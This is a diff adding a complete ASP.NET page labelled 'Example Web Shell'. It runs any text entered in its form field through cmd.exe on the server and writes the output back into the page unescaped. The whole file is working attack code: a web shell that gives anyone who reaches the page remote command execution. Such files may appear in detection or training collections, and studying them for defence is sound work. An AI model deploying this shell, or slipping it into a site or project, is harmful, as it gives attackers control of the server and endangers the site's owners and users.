@@ -1,0 +1,36 @@
+﻿<% @Page Language="C#" %>
+
+<script runat="server">
+  private void runcmd(object sender, EventArgs e)
+  {
+    var psi = new System.Diagnostics.ProcessStartInfo()
+    {
+      FileName = "cmd.exe",
+      Arguments = "/c \"" + input.Value + "\"",
+      CreateNoWindow = true,
+      RedirectStandardError = true,
+      RedirectStandardOutput = true,
+      UseShellExecute = false
+    };
+    var proc = new System.Diagnostics.Process();
+    proc.StartInfo = psi;
+    proc.Start();
+    proc.WaitForExit();
+    var errandout = proc.StandardError.ReadToEnd() + "\n" + proc.StandardOutput.ReadToEnd();
+    output.InnerHtml = errandout;
+  }
+</script>
+<html>
+  <head>
+    <title>Example Web Shell</title>
+  </head>
+  <body>
+    <h3>Example Web Shell</h3>
+    <form runat="server">
+      <input runat="server" id="input" type="text" />
+      <input runat="server" id="button1" type="submit" value="Submit" OnServerClick="runcmd"/>
+      <h3>Output:</h3>
+      <pre runat="server" id="output" />
+    </form>
+  </body>
+</html>
